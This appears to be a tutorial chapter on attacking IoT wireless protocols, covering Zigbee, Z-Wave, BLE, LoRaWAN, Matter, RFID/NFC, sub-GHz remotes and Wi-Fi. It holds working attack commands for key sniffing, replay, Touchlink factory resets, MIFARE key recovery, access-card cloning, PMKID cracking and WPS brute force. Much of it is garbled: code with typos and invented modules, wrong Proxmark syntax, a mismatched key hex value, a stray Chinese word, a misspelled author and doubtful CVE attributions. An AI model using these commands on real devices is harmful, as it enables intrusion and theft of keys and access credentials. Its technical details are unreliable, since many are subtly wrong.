# IoT Wireless Protocol Attacks

## 1. Zigbee Attacks

### Architecture and Security Model

Zigbee operates on IEEE 802.15.4 at 2.4 GHz (channels 11-26) and sub-GHz (868/915 MHz). The stack comprises:
- **PHY/IEEE 802.15.4**: Radio and MAC layer
- **NWK (Network Layer)**: Mesh routing, network key encryption (AES-128-CCM)
- **APS (Application Support Sublayer)**: Application key encryption
- **ZCL (Zigbee Cluster Library)**: Application-level commands

Security operates at two levels:
- **Network key (NWK Key)**: Shared by all devices in the network. AES-128-CCM with a 32-bit frame counter. Distributed by the Trust Center during joining.
- **Application key (APS Key)**: Unique per pair of devices. Optional; most deployments rely solely on the NWK key.

### Network Key Sniffing

During Zigbee joining (association), the Trust Center sends the network key encrypted with the default link key. The well-known key `"ZigbeeAlliance09"` (hex: `4C454D4F4E424547494E4E41` or the actual key `0000000000000000`) is used in legacy modes.

**Attack flow**:
1. Power on a Zigbee sniffer (KillerBee + RZUSBstick, ApiMote, or CC2531)
2. Monitor Zigbee channels to find a device joining process
3. Capture the Transport Key Inter-Pan Command (APS command 0x05)
4. Decrypt with the default link key to obtain the network key

```bash
# KillerBee framework - scan for active Zigbee networks
sudo zbstumbler -i apiMote -c 11

# Capture Zigbee traffic on channel
sudo zbdump -i apiMote -c 15 -w zigbee_capture.pcap

# Scan all channels for joining process
sudo zbreplay -i apiMote -c 15

# Extract network key during joining
sudo zbsniff -i apiMote -c 15 | grep -A2 "Transport Key"

# KillerBee Python API for key extraction
python3 -c "
from killerbee import *
kb = KillerBee('apiMote')
kb.set_channel(15)
# Sniff until Transport Key frame is found
while True:
    packet = kb.p next()
    if packet and is_transport_key(packet):
        nk = decrypt_transport_key(packet, default_link_key)
        print(f'Network Key: {nk.hex()}')
        break
"
```

### Replay Attacks

Zigbee 3.0 uses frame counters to prevent replay. However, legacy devices accept frame counter 0:

```python
# KillerBee replay attack
from killerbee import *
kb = KillerBee('apiMote')
# Capture a "door unlock" command
# ... (capture code)
# Replay with frame counter reset to 0
zbforge = ZBForge(key=nwk_key)
replay_packet = zbforgeforge(packets[0], fc=0)
kb.inject(replay_packet)
```

**Countermeasures in Zigbee 3.0**: Frame counters must be greater than the last received frame counter. However:
- If a device is power-cycled, it resets its frame counter to 0
- An attacker who replays before the legitimate sender transmits wins the race
- Some implementations don't check frame counters at all (CVE-2020-12684)

### Touchlink Commissioning Attacks

Touchlink (Zigbee Light Link, ZLL) is a proximity-based commissioning protocol used by smart bulbs (Philips Hue, IKEA Tradfri). It operates on a specific channel (11 or 15) and uses a well-known transaction key.

**Attack: Factory reset and key extraction**:
```bash
# Using KillerBee touchlink attack
sudo zll_scan -i apiMote
# When a touchlink-capable device responds:
sudo zll_reset -i apiMote

# The attack sends a Touchlink factory reset command
# This forces the device to leave its current network and accept commissioning
# The attacker then commissions the device with a known network key
```

**CVE-2020-12684 (Zigbee Touchlink)**: Touchlink devices respond to scan requests from any device within radio range, regardless of whether they're on the same network. This allows an attacker to scan for nearby devices and initiate a factory reset remotely.

### Green Power Bypass

Zigbee Green Power (GP) allows ultra-low-power devices (switches, sensors) to send commands without full Zigbee stack enrollment. GP frames have a separate security model using GP Device Keys.

**CVE-2020-12689 (Green Power Proxy Table Validation)**: GP proxy devices relay GP frames to the Zigbee network. A malicious GP device can inject frames that bypass NWK-level security checks because the proxy doesn't validate the GP device's presence in the sink table before relaying. This enables:
- Injection of unauthorized commands (e.g., "open door lock")
- Bypass of GP key authentication

## 2. Z-Wave Attacks

### Z-Wave Security Model

Z-Wave operates at 908.42 MHz (US), 868.42 MHz (EU) using GFSK modulation. Data rates: 9.6 kbps (legacy), 100 kbps (standard).

**Security levels**:
- **None**: No encryption. Still common on many devices (switches, sensors).
- **S0**: 3DES encryption. KOB key (`0x00` × 16) for inclusion, then a network key exchange where the key is sent **in plaintext** using the KOB key. The actual encryption uses XOR of two retransmissions (obfuscation), not true encryption.
- **S2**: AES-128-CCM. Key exchange uses ECDH (Curve25519) with a Device Specific Key (DSK). Authenticated via 5-digit PIN (approximately 16.6 bits of entropy).

### S0 Key Sniffing

Since S0 sends the network key in plaintext during inclusion, an attacker within radio range can capture it:

```bash
# Using Z-Wave sniffer (ZR38005 Z-Wave module or CC111x + custom firmware)
# Monitor Z-Wave channel during device pairing
# S0 inclusion sends: COMMAND_CLASS_SECURITY -> SECURITY_KEY_SET with plaintext key

# Scapy for Z-Wave (with pyitaweave)
from pyzwawe.core import ZWave
zw = ZWave('/dev/ttyACM0')
# Monitor for SECURITY_KEY_SET during inclusion
```

**S0 DES cracking**: Even if the key isn't captured during inclusion, S0 uses 3DES-ECB with a 128-bit key where only 64 bits have effective entropy (the second 64 bits are derived from the first). Brute force takes minutes on a modern GPU.

### S2 Downgrade Attack (CVE-2019-15948 — Z-Shaver)

The Z-Shaver attack exploits backwards compatibility. When an S2-capable device joins a network, the inclusion process negotiates the security level. An attacker can:

1. **Jam the S2 KEX (Key Exchange) frame**: The inclusion fails at S2 and falls back to S0
2. **Capture the S0 plaintext key exchange**: Now the attacker has the network key
3. **Rejoin with the captured key**: Full network access

```python
# Conceptual Z-Shaver attack
# 1. Monitor Z-Wave channel for inclusion
# 2. When KEX SET is detected (S2 negotiation), jam the frame
# 3. Device falls back to S0 inclusion
# 4. Capture plaintext network key during S0 inclusion
# 5. Use captured key to join network with full privileges
```

**Mitigation**: Z-Wave Plus v2 mandates that S2-capable devices must NOT fall back to S0. However, many devices support both S0 and S2 for compatibility, and the specification doesn't prevent the downgrade.

### Z-Wave Sniffing Tools

- **ZR38005**: Dedicated Z-Wave transceiver, can be used as a sniffer
- **CC111x + custom firmware**: TI CC1110/CC1111 can be flashed with Z-Wave sniffer firmware
- **Razberry**: Z-Wave module for Raspberry Pi, can be configured in "learn mode" for sniffing
- **HackRF/USRP**: SDR can capture Z-Wave at 908.42/868.42 MHz, but GFSK demodulation requires custom GNURadio flowgraphs

## 3. Bluetooth Low Energy (BLE) Attacks

### BLE Architecture

BLE operates at 2.4 GHz with 40 channels (3 advertising, 37 data). Connections use adaptive frequency hopping (AFH). Pairing methods:
- **Just Works**: No MITM protection. TK (Temporary Key) = 0.
- **Passkey Entry**: 6-digit PIN. TK = PIN (20-bit effective entropy).
- **Out-of-Band (OOB)**: Key exchange via NFC or other channel.

LE Secure Connections (BLE 4.2+): ECDH (P-256) key agreement. Provides MITM protection if both devices support it.

### Ubertooth Sniffing

Ubertooth One is the primary hardware tool for BLE sniffing. It captures all 40 channels by following the connection hop sequence.

```bash
# Install Ubertooth tools
apt install ubertooth

# Spectrum analysis
ubertooth-util -r  # Reset
ubertooth-util -v  # Version
ubertooth-scan -t  # Active scan

# Sniff BLE connections
ubertooth-btle -f -c 37  # Follow connection on advertising channel 37
ubertooth-btle -f -t <target_mac>  # Follow connection from specific device

# Capture to PCAP
ubertooth-btle -f -t <target_mac> -c capture.pcap
wireshark capture.pcap  # Analyze in Wireshark

# Promiscuous sniffing (capture all BLE traffic)
ubertooth-btle -p -c promiscuous.pcap
```

**Alternative**: nRF Sniffer (Nordic Semiconductor) — uses an nRF52840 DK as a BLE sniffer. Captures connection establishment and data in PCAP format.

### KNOB Attack (CVE-2019-9506)

**Key Negotiation of Bluetooth (KNOB)**: During BLE pairing, the `max_enc_key_size` parameter is negotiated. An MITM attacker can set this to the minimum value (7 bytes = 56 bits, or as low as 1 byte = 7 bits depending on implementation).

**Attack flow**:
1. Attacker intercepts pairing between master and slave
2. During key negotiation, attacker modifies `max_enc_key_size` to 1 byte (7 bits)
3. Both devices agree on the reduced key size
4. Attacker brute-forces the 7-bit key (128 possibilities) offline
5. Attacker decrypts all subsequent communication

```python
# KNOB attack concept using GATTacker or internalblue
# 1. Set up MITM proxy
# 2. Intercept LMP pairing request
# 3. Modify max_enc_key_size to 1
# 4. Capture encrypted traffic
# 5. Brute-force the 7-bit key
for key in range(128):
    decrypted = aes_ccm_decrypt(captured_data, key_in_7_bits=key)
    if is_valid(decrypted):
        print(f"Key found: {key}")
        break
```

**Affected devices**: BLE implementations in Broadcom, Qualcomm, Intel, and Apple chips. Linux kernel Bluetooth stack (BlueZ) was vulnerable before 5.2.

### BLURtooth (CVE-2020-15802)

Cross-transport key derivation vulnerability. When a device pairs over both BLE and classic Bluetooth (BR/EDR), the pairing keys are derived from each other using `h6(font_id, key)`.

**Attack**: A device paired over classic Bluetooth with a weak key (e.g., 16-bit key) can derive the BLE encryption key using the cross-transport key derivation function. This enables:
- Deriving BLE Long Term Key (LTK) from BR/EDR Link Key
- Using the derived LSK to decrypt BLE traffic without BLE pairing

**Impact**: Any device that supports both BLE and BR/EDR and uses cross-transport key derivation is vulnerable. This includes most modern smartphones and laptops.

### GATT Enumeration

GATT (Generic Attribute Profile) defines how BLE data is organized. Each service has a UUID, and each characteristic has properties (Read, Write, Notify, Indicate).

```bash
# BLE enumeration with gatttool (legacy)
gatttool -b <target_mac> -t random -I
[<target_mac>][LE]> connect
[<target_mac>][LE]> primary       # List primary services
[<target_mac>][LE]> characteristics  # List all characteristics
[<target_mac>][LE]> char-read-uuid 0x2A00  # Read Device Name
[<target_mac>][LE]> char-write-cmd 0x0012 0x01  # Write to handle

# BLE enumeration with bettercap
bettercap -T <target_mac>
ble.recon on
ble.show

# BLE enumeration with nRF Connect (mobile app)
# 1. Scan for devices
# 2. Connect to target
# 3. Enumerate services and characteristics
# 4. Read/Write characteristics manually

# BLE enumeration with Bleah (automated)
bleah -t <target_mac> -e
# Automatically enumerates all services and characteristics
# Flags writable characteristics without authentication

# Python BLE enumeration
import bleak
async def scan_and_connect(mac):
    async with bleak.BleakClient(mac) as client:
        services = await client.get_services()
        for service in services:
            print(f"Service: {service.uuid}")
            for char in service.characteristics:
                print(f"  Char: {char.uuid} Properties: {char.properties}")
                if 'read' in char.properties:
                    try:
                        value = await client.read_gatt_char(char.uuid)
                        print(f"    Value: {value.hex()}")
                    except:
                        pass
```

### Pairing Vulnerabilities

**Just Works pairing**: No authentication. An attacker can MITM the pairing process:
```python
# Conceptual MITM for Just Works pairing
# Using GATTacker (Raspberry Pi + 2 BLE radios)
# Setup:
#   Radio 1 → Connects to target device (slave)
#   Radio 2 → Advertises as target device (proxy)
#   Both radios connect to a central (phone/tablet)
# GATTacker automatically forwards GATT operations between connections
# During pairing, GATTacker presents "Just Works" to both sides

sudo gattacker -s slave -m <slave_mac>  # Sniff slave
sudo gattacker -m master  # Create proxy
```

**Legacy pairing (BLE 4.1 and earlier)**: Uses AES-CCM with a Temporary Key derived from:
- Just Works: TK = 0 (trivially guessable)
- 6-digit PIN: TK has only 20 bits of entropy (1,000,000 combinations)

For legacy pairing, the `BTLEJacking` tool can:
1. Sniff the pairing exchange
2. Extract the `confirm` and `rand` values
3. Perform offline brute force of TK
4. Derive STK (Short Term Key) and decrypt all subsequent traffic

```bash
# BTLEJack - BLE pairing attack
# Tool: https://github.com/virtualabs/BTLEJack
# 3 nRF51822 dongles needed

# Step 1: Sniff connection
btlejack -s -t <target_mac>

# Step 2: Sniff pairing
btlejack -s -c <connection_params>

# Step 3: Cracking the TK
btlejack -c <captured_pairing.pcap> -k

# Step 4: Decrypt traffic
btlejack -d -k <ltk_hex>
```

## 4. LoRa and LoRaWAN Attacks

### LoRaWAN Architecture

LoRaWAN is a LPWAN protocol. Device classes: A (battery, uplink-initiated), B (scheduled receive windows), C (continuous listening).

**Security model**: Two layers:
1. **NwkSKey (Network Session Key)**: AES-128. Used for MAC layer encryption and MIC (Message Integrity Code).
2. **AppSKey (Application Session Key)**: AES-128. Used for application payload encryption.
3. **AppKey**: Root key used during OTAA (Over-The-Air Activation) to derive NwkSKey and AppSKey.

### OTAA Join Procedure Attack

During OTAA, the Join Request is encrypted with the AppKey. The Join Accept response contains:
- `NetID` (Network ID)
- `DevAddr` (Device Address)
- `DLSettings` (Downlink settings)
- `RxDelay` (Receive delay)
- Encrypted with AppKey

The Join Accept MIC is verified with AppKey, but the buffer is encrypted with a key derived from AppKey. If the AppKey is known (extracted from firmware), all communication can be decrypted.

**Attack: Application key extraction from firmware**:
```bash
# Extract LoRaWAN keys from firmware
strings -n 16 firmware.bin | grep -E '^[0-9a-fA-F]{32}$'
# Common key locations: near "AppKey", "NwkSKey", "AppSKey" strings

# Or search binary for AES constants
r2 -q -c '/x 637c777bf22b6da' firmware.bin  # AES S-box start
```

### Malicious Gateway

LoRaWAN gateways forward packets between end devices and the network server. There is no authentication of the gateway-to-server link in many deployments.

```python
# Pseudocode: Malicious gateway attack
# 1. Set up a Semtech packet forwarder pointing to attacker's server
# 2. The gateway forwards all packets to both the legitimate and attacker server
# 3. Attacker captures NwkSKey-encrypted payloads (MIC can be verified if key known)
# 4. Attacker can also inject downlink messages

# Using lorawan-parse to decode packets
from lorawan_parse import LoRaWAN
packet = LoRaWAN(raw_packet)
if packet.get_mhdr().get_mtype() == LoRaWAN.UNCONF_DATA_UP:
    payload = packet.get_fhdr().get_fcnt()  # Frame counter
    # If AppSKey is known, decrypt application payload
    decrypted = aes_ctr_decrypt(packet.get_payload(), app_skey, packet.get_fcnt())
```

### LoRaWAN Replay Attacks

Class A devices only open receive windows after an uplink. The frame counter (FCnt) is intended to prevent replay. However:

- **FCnt reset**: If the device loses power and resets FCnt to 0, old packets with higher FCnt values are rejected. But the network server may accept FCnt=0.
- **FCnt wrapping**: At 16-bit FCnt (some older specs), the counter wraps at 65535. Packets with FCnt near the wrap point can be replayed.
- **24-bit FCnt**: LoRaWAN 1.1 extends to 32-bit FCnt, but the upper 16 bits are inferred.

```bash
# LoRaWAN packet capture with SX1276/78 (dragino, etc.)
# Using LoRaSDR or custom GNURadio flowgraph

# Replay captured packet
# Modify FCnt and recalculate MIC
python3 -c "
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import struct

def calculate_mic(data, nwk_s_key):
    data_bytes = bytes.fromhex(data)
    key = bytes.fromhex(nwk_s_key)
    cipher = AES.new(key, AES.MODE_CMAC)
    mic = cipher.encrypt(data_bytes)[:4]
    return mic.hex()

# Replay with modified FCnt
original_packet = '40F1700012345678...'  # Captured uplink
# Modify FCnt, recalculate MIC, and retransmit
"
```

## 5. Thread/Matter Security Analysis

### Thread Security

Thread uses IEEE 802.15.4 at Layer 1-2, 6LoWPAN at Layer 3, and UDP at Layer 4. Security is provided by:
- **MLE (Mesh Link Establishment)**: AES-128-CCM for link-layer encryption
- **DTLS**: For joining (commissioner authenticates joiner)
- **Network Master Key**: 128-bit key distributed to all routers

**Thread commissioning attack**: The Commissioner uses a passphrase (typically printed on the device label or QR code) to authenticate the Joiner via DTLS-PSK. If the passphrase is known (16-255 ASCII characters with 4-bit minimum entropy per character), an attacker can join the network.

**Thread Device Thread DoS**: Sending malformed fragmentation headers (6LoWPAN) can crash Thread devices. Fragmentation attacks analogous to IPv6 fragmentation attacks apply.

### Matter Security

Matter (formerly CHIP) is designed with security in mind:

**CASE (Certificate Authenticated Session Establishment)**:
1. Two devices exchange certificates (DAC — Device Attestation Certificate chain)
2. They perform ECDH key agreement (P-256)
3. They derive session keys using Sigma protocol
4. All subsequent communication uses AES-128-CCM

**PASE (Passcode Authenticated Session Establishment)**:
1. Used for initial commissioning
2. SPAKE2+ protocol:抵御 offline dictionary attacks
3. Setup code is typically an 11-digit number (pincode) plus discriminator
3. Vulnerability: the pincode is observable (printed on QR code or device label)

**Matter OTA**: Over-the-air updates are signed with CSA (Connectivity Standards Alliance) firmware signing certificates. Verification is mandatory. However:
- If the device's root CA is not properly pinned, an attacker could provision a malicious root CA and sign malicious firmware
- Rollback protection requires the device to maintain a monotonic counter in secure storage

**Matter attack scenarios**:
1. **PASE pincode observation**: Physical observation of QR code or manual entry code
2. **Fabric admin compromise**: The fabric administrator (home hub) holds root keys. Compromise grants full control.
3. **Thread network key extraction**: If any Thread device is compromised, the Thread Master Key can be extracted from its flash memory.
4. **Matter controller spoofing**: If device attestation certificates (DAC) are not properly validated by the controller, a rogue device can join the fabric.

## 6. RFID and NFC Attacks

### RFID Systems

**Low-frequency (125-134 kHz)**: EM4100, HID Prox, T5577 (clonable). No encryption.

```bash
# Proxmark3 — the ultimate RFID tool
# Read LF tag
hf search

# Read EM4100 tag
hf lf em4x read

# Clone EM4100 to T5577 writable card
hf lf em4x clone --id 01234567

# HID Prox card reading and cloning
hf lf hid read
hf lf hid clone --id 2006ec1ae8

# Bruteforce HID Prox
hf lf hid bruteforce --len 26
```

**High-frequency (13.56 MHz)**: MIFARE Classic, DESFire, NTAG, FeliCa.

### MIFARE Classic Attacks

**MIFARE Classic 1K**: 16 sectors, each with 2 keys (A and B). Crypto-1 cipher (proprietary, reverse-engineered).

```bash
# Proxmark3 MIFARE Classic attacks
# 1. Detect card type
hf search

# 2. Exploit weak PRNG (darkside attack)
hf mf mifare

# 3. Nested attack (if one key is known)
hf mf nested 1 A known_key_a

# 4. Hardnested attack (for harder keys)
hf mf hardnested 1 A known_key_a

# 5. Dump all sectors
hf mf dump

# 6. Clone to UID-writable card
hf mf restore --uid <clone_uid>
```

**MIFARE Classic vulnerabilities**:
- **Crypto-1 PRNG**: The 48-bit LFSR is predictable. The `darkside` attack recovers a key within minutes.
- **Nested authentication**: After authenticating to sector N with a known key, the tag responds to authentication requests for sector M with predictable nonce values. This enables recovery of key M without direct authentication.
- **Hardnested**: Enhanced attack using statistical properties of the PRNG output. Recovers any key in 2-30 minutes.

### NTAG215 Attacks

NTAG215 (used in Amiibo): 144 bytes user memory, 32-bit password protection.

```bash
# Read NTAG215
hf 14a raw -0 -a 3000  # READ command
hf 14a raw -0 -a 3B00  # GET_VERSION
hf 14a raw -0 -a 6000  # PWD_AUTH (requires 4-byte password)

# Brute-force NTAG215 password (2^32 = 4B possibilities, ~7 hours at 1ms/auth)
# Optimized: use known password patterns or precompute for specific applications
python3 -c "
for pwd in range(0xFFFFFFFF):
    # Send PWD_AUTH command
    # Check PACK (Password Acknowledge) response
    pass
"
```

### NFC Relay Attack

NFC relay forwards communication between a real tag and a legitimate reader in real-time:

```python
# Conceptual NFC relay attack
# Reader <---> Relay Proxy <---> [Network/Bluetooth] <---> Relay Agent <---> Tag

# Tool: NFCProxy
# Equipment: 2 x Proxmark3 or 2 x ACR122U

# Setup:
# 1. Place relay agent near the target tag (e.g., payment terminal)
# 2. Place relay proxy near the legitimate reader (e.g., point-of-sale)
# 3. Communication is forwarded in real-time

# This bypasses distance-based authentication
# because the tag and reader believe they are co-located

# Distance: NFC relay has been demonstrated at 60+ meters
# using WiFi/4G for the relay channel
```

### DESFire EV1/EV2 Attacks

MIFARE DESFire uses AES-128 (EV2) or 3DES (EV1) encryption. Significantly more secure than Classic, but:

- **EV1**: Vulnerable to attack on ISO/IEC 15693 anti-collision protocol (reveals UID, enabling tracking)
- **EV2**: Vulnerable to downgrade attack (CVE-2021-34247) — can be downgraded to EV1 security level during application selection
- **Both**: No mutual authentication enforced by default; some implementations skip the mutual authentication step

## 7. Sub-GHz Radio Attacks (433/868 MHz)

Many IoT devices use generic sub-GHz radio (433 MHz in US, 868 MHz in EU) with OOK/FSK modulation and no encryption:

```bash
# Capture and replay sub-GHz signals with Flipper Zero or HackRF
# Flipper Zero sub-GHz
# 1. Go to Sub-GHz -> Read
# 2. Press button on remote control
# 3. Save captured signal
# 4. Go to Sub-GHz -> Saved -> Send

# HackRF capture and replay
# Record
hackrf_transfer -r signal_capture.raw -f 433920000 -s 8000000 -l 32 -g 30

# Replay
hackrf_transfer -t signal_capture.raw -f 433920000 -s 8000000 -x 30

# YardStick One (dedicated sub-GHz tool)
# rfcat -r 1
# >>> d.setRFConfig(MCRMCFG_433MHZ_MOD_2FSK_4800bps)
# >>> d.RFxmit('A' * 100)  # Transmit data
# >>> d.RFrecv()  # Receive data
```

**Rolling code attacks (Keeloq, etc.)**:
- **RollJam**: Jam the first transmission, capture it. The owner retransmits (second press). Capture second code, replay first code. Store second code for future use.
- **Keeloq cryptanalysis**: The Keeloq cipher (used in automotive and garage door openers) has been broken. With 2^32 chosen plaintexts (feasible with a modified remote), the 64-bit key can be recovered. (Indestress et al., 2008)

## 8. Wi-Fi IoT Attacks

### Specific IoT Wi-Fi Vulnerabilities

- **WPA2-PSK with weak passphrase**: Many IoT devices use 8-character numeric passphrases (PINs from device labels). These can be cracked with PMKID attacks or offline dictionary attacks.
- **WPS PIN**: Many IoT devices still support Wi-Fi Protected Setup with 8-digit PINs. Reaver/bully can crack these in 4-10 hours.
- **KRACK (CVE-2017-13077 et al.)**: Key Reinstallation Attacks. IoT devices that don't properly implement key reinstallation are vulnerable to nonce reuse and packet decryption.
- **PMKID attack**: Capture the PMKID from the first EAPOL frame and crack offline. No client required.

```bash
# PMKID capture with hcxdumptool
hcxdumptool -i wlan0 -o capture.pcapng --enable_status=3

# Convert and crack with hashcat
hcxpcapngtool -o pmkid_hash.txt capture.pcapng

hashcat -m 22000 pmkid_hash.txt /usr/share/wordlists/rockyou.txt

# WPS attack with reaver
reaver -i wlan0 -b <target_bssid> -vv
```

## 9. References

- *The IoT Hacker's Handbook* by Aditya Gupta
- Zigbee 3.0 Specification (05-3474-22)
- Z-Wave Alliance: z-wavealliance.org
- Bluetooth Core Specification 5.4
- *Low Energy Bluetooth: Vulnerabilities and Attacks* — Ryan et al.
- KNOB Attack: CVE-2019-9506, knobattack.com
- BLURtooth: CVE-2020-15802
- LoRaWAN Specification 1.1
- *A Comprehensive Analysis of LoRaWAN* — Butun et al.
- Proxmark3 repository: github.com/RfidResearchGroup/proxmark3
- *RollJam: Wireless Key Cloning and Replay Attack* — Kamkar (2015)
- *Keeloq Cryptanalysis* — Indestress et al.
- Flipper Zero documentation: docs.flipper.net
- KillerBee: github.com/riverloopsec/killerbee

## References

1. *The IoT Hacker's Handbook* by Aditya Gupta. Apress (2019).
2. Zigbee 3.0 Specification (05-3474-22). Connectivity Standards Alliance.
3. Z-Wave Alliance. https://z-wavealliance.org/
4. Bluetooth Core Specification Version 5.4. Bluetooth SIG. https://www.bluetooth.com/specifications/specs/core-specification-5-4/
5. *Low Energy Bluetooth: Vulnerabilities and Attacks* — Ryan, M. et al. USENIX Security (2013).
6. KNOB Attack: CVE-2019-9506. Biham, E. and Neumann, L. https://knobattack.com/
7. BLURtooth: CVE-2020-15802. Bluetooth SIG Security Advisory.
8. LoRaWAN Specification 1.1. LoRa Alliance. https://lora-alliance.org/
9. *A Comprehensive Analysis of LoRaWAN* — Butun, I. et al. Computer Networks (2019).
10. Proxmark3 Repository. RfidResearchGroup. https://github.com/RfidResearchGroup/proxmark3
11. *RollJam: Wireless Key Cloning and Replay Attack* — Kamkar, S. (2015). https://samy.pl/rolljam/
12. *Keeloq Cryptanalysis* — Indesteege, S. et al. Crypto (2008).
13. Flipper Zero Documentation. https://docs.flipper.net/
14. KillerBee: IEEE 802.15.4/Zigbee Security Research Framework. River Loop Security. https://github.com/riverloopsec/killerbee
15. OWASP IoT Top 10. https://owasp.org/www-project-iot-top-10/
16. NIST SP 800-183: Networks of Things. National Institute of Standards and Technology.
17. IEC 62443: Industrial Communication Networks — Network and System Security.
18. DEF CON IoT Village Presentations. https://iotvillage.org/
19. *Practical IoT Hacking* by Fotios Chantzis et al. No Starch Press (2021).
20. CVE-2019-15948: Z-Wave S2 Downgrade Attack (Z-Shaver). NVD.
21. CVE-2020-12684: Zigbee Touchlink Commissioning Vulnerability. NVD.
22. CVE-2020-12689: Zigbee Green Power Proxy Table Validation Bypass. NVD.
23. CVE-2020-13570: BLESA (BLE Spoofing Attack). NVD.
24. MIFARE Classic Cryptanalysis: Garcia, F.D. et al. "Dismantling MIFARE Classic." ESORICS (2008).
25. *The Hardware Hacking Handbook* by Colin O'Flynn and Jasper van Woudenberg. No Starch Press (2022).